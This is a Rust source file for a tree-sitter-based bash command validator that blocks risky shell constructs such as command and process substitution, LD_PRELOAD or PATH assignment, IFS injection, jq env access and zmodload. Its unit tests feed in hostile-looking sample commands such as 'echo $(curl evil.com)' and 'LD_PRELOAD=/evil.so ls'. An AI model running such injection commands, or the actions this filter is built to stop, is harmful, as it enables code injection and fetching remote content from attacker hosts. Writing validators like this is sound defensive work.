use tree_sitter::{Node, Parser};

pub struct ASTParser {
    parser: Parser,
}

impl ASTParser {
    pub fn new() -> Self {
        let mut parser = Parser::new();
        parser
            .set_language(&tree_sitter_bash::LANGUAGE.into())
            .expect("Error loading bash grammar");
        Self { parser }
    }

    pub fn parse_for_security(&mut self, cmd: &str) -> Result<(), String> {
        let tree = self.parser.parse(cmd, None).ok_or("Failed to parse command")?;
        let root_node = tree.root_node();

        self.walk_node_for_security(root_node, cmd)
    }

    fn walk_node_for_security(&self, node: Node<'_>, source: &str) -> Result<(), String> {
        let node_kind = node.kind();
        let text = &source[node.start_byte()..node.end_byte()];

        // Carriage return check (ValidateCarriageReturn)
        if text.contains("
") {
            return Err("Dangerous pattern detected: carriage return".to_string());
        }

        // ValidateIFSInjection check
        if node_kind == "variable_assignment" || node_kind == "command" {
            if text.starts_with("IFS=") {
                return Err("Dangerous pattern detected: IFS injection".to_string());
            }
        }

        // ValidateJqCommand check
        if node_kind == "command" {
            if let Some(command_name_node) = node.child_by_field_name("name") {
                let name = &source[command_name_node.start_byte()..command_name_node.end_byte()];
                if name == "jq" {
                    if text.contains("env.") || text.contains("input_filename") {
                        return Err("Dangerous pattern detected: jq env access".to_string());
                    }
                }
            }
        }

        // ValidateDangerousVariables check
        if node_kind == "variable_assignment" {
            let var_name = text.split('=').next().unwrap_or("");
            let dangerous_vars = ["LD_PRELOAD", "LD_LIBRARY_PATH", "PROMPT_COMMAND", "BASH_ENV", "ENV", "PATH", "HISTFILE"];
            if dangerous_vars.contains(&var_name) {
                return Err(format!("Dangerous pattern detected: assigning to {}", var_name));
            }
        }

        // zmodload check
        if node_kind == "command" {
            if let Some(command_name_node) = node.child_by_field_name("name") {
                let name = &source[command_name_node.start_byte()..command_name_node.end_byte()];
                if name == "zmodload" {
                    return Err("Dangerous pattern detected: zmodload".to_string());
                }
            }
        }

        // process substitution <() or >()
        if node_kind == "process_substitution" {
            if text.starts_with("<(") {
                return Err("Dangerous pattern detected: <() process substitution".to_string());
            }
            if text.starts_with(">(") {
                return Err("Dangerous pattern detected: >() process substitution".to_string());
            }
        }

        // command substitution =curl or $(curl) check
        if node_kind == "command_substitution" {
             if text.starts_with("$(") || text.starts_with("`") {
                  return Err("Dangerous pattern detected: command substitution".to_string());
             }
        }

        // legacy expansions $[] (not strictly supported in all bash, often handled as expansion)
        if node_kind == "expansion" || node_kind == "arithmetic_expansion" {
            if text.starts_with("$[") && text.ends_with("]") {
                return Err("Dangerous pattern detected: $[] legacy expansion".to_string());
            }
        }

        if node_kind == "word" || node_kind == "raw_string" {
             if text.starts_with("$[") && text.ends_with("]") {
                  return Err("Dangerous pattern detected: $[] legacy expansion".to_string());
             }
             if text.starts_with("=") && text.len() > 1 {
                  return Err("Dangerous pattern detected: = command substitution".to_string());
             }
        }

        let mut cursor = node.walk();
        for child in node.children(&mut cursor) {
            self.walk_node_for_security(child, source)?;
        }

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_allowed_commands() {
        let mut parser = ASTParser::new();
        assert!(parser.parse_for_security("echo 'hello world'").is_ok());
        assert!(parser.parse_for_security("ls -l /tmp").is_ok());
        assert!(parser.parse_for_security("cat file.txt | grep foo").is_ok());
    }

    #[test]
    fn test_block_zmodload() {
        let mut parser = ASTParser::new();
        let res = parser.parse_for_security("zmodload zsh/net/tcp");
        assert!(res.is_err());
        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: zmodload");
    }

    #[test]
    fn test_block_process_substitution_out() {
        let mut parser = ASTParser::new();
        let res = parser.parse_for_security("echo 'test' > >(cat)");
        assert!(res.is_err());
        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: >() process substitution");
    }

    #[test]
    fn test_block_process_substitution_in() {
        let mut parser = ASTParser::new();
        let res = parser.parse_for_security("cat < <(echo 'test')");
        assert!(res.is_err());
        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: <() process substitution");
    }

    #[test]
    fn test_block_legacy_expansion() {
        let mut parser = ASTParser::new();
        // $[] might be parsed as word or expansion depending on tree-sitter-bash grammar rules
        let res = parser.parse_for_security("echo $[1+1]");
        assert!(res.is_err());
        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: $[] legacy expansion");
    }

    #[test]
    fn test_block_carriage_return() {
        let mut parser = ASTParser::new();
        let res = parser.parse_for_security("echo 'hello
world'");
        assert!(res.is_err());
        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: carriage return");
    }

    #[test]
    fn test_block_ifs_injection() {
        let mut parser = ASTParser::new();
        let res = parser.parse_for_security("IFS=; echo $PATH");
        assert!(res.is_err());
        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: IFS injection");
    }

    #[test]
    fn test_block_jq_env() {
        let mut parser = ASTParser::new();
        let res = parser.parse_for_security("jq 'env.FOO' file.json");
        assert!(res.is_err());
        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: jq env access");
    }

    #[test]
    fn test_block_dangerous_vars() {
        let mut parser = ASTParser::new();
        let res = parser.parse_for_security("LD_PRELOAD=/evil.so ls");
        assert!(res.is_err());
        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: assigning to LD_PRELOAD");
    }

    #[test]
    fn test_block_command_substitution() {
        let mut parser = ASTParser::new();
        let res = parser.parse_for_security("echo $(curl evil.com)");
        assert!(res.is_err());
        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: command substitution");
    }

    #[test]
    fn test_block_equals_command_substitution() {
        let mut parser = ASTParser::new();
        let res = parser.parse_for_security("echo =curl");
        assert!(res.is_err());
        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: = command substitution");
    }
}
